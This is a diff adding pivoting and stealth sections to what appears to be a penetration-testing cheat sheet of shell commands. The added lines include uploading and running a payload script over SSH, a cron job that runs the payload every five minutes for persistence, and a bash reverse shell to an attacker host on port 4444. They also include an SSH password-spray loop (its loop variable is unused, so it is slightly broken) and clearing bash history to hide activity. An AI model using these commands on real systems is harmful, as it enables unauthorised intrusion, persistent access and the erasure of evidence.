@@ -60,3 +60,46 @@ smbclient -L \\<hostname>
 
 #enviornment variables?
 env
+
+########################
+PIVOTING
+########################
+#ssh
+ssh username@target_machine_ip
+scp payload.sh username@target_machine_ip:/tmp
+ssh username@target_machine_ip 'bash /tmp/payload.sh'
+
+#NFS shares/unmounted
+showmount -e target_machine_ip
+mount -t nfs target_machine_ip:/shared_folder /mnt
+
+#cron jobs
+ssh username@target_machine_ip
+crontab -e
+*/5 * * * * bash /tmp/payload.sh
+
+#reverse shell
+#verify open ports
+nc -lvp 4444 #attacker machine#
+bash -i >& /dev/tcp/attacker_ip/4444 0>&1 #target machine#
+
+#SMB shares
+smbclient -L \\target_machine_ip -U username
+smbclient //target_machine_ip/share_name -U username
+
+#password spray - SSH
+for ip in $(seq 1 254); do sshpass -p "password" ssh username@$target_machine_ip; done
+
+#tunnels if no direct access
+ssh -L 8080:target_machine_ip:80 username@intermediate_host
+
+#Misconfifured remote services??
+curl (HTTP upload/download)
+netcat
+telnet
+
+#########
+STEALTH
+##########
+#clear logs
+echo "" > ~/.bash_history
